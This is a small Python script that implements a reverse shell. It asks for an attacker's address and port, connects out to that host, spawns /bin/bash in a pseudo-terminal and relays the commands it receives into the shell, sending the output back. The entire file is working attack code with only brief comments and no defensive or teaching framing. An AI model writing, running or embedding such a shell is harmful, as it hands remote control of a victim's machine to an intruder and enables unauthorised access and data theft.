import socket
import os
import pty

#Setting the IPV4/TCP connection
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

#Getting args to respective user connection
address = input("Type the attacker address\n")
port = int(input("Type the enabled port\n"))

#Connect to the attacker server
client.connect((address, port))

#Execute bin/bash after the connection
try:

	client.send(b"Connection established.")

	#Create a pseudo-terminal and spawn a bash shell
	pid, fd = pty.fork()

	if pid == 0:
		os.execv("/bin/bash", ["/bin/bash"])
	else:

		while True:
			#Receive commands from atacker server
			command = client.recv(2048)

			if command.strip() == b"exit":
				break

			#Write the command to the shell
			os.write(fd, command + b"\n")
		

			#Read output
			output = os.read(fd, 1024)
		

		
			client.send(output)
		
			
finally:

	client.close()
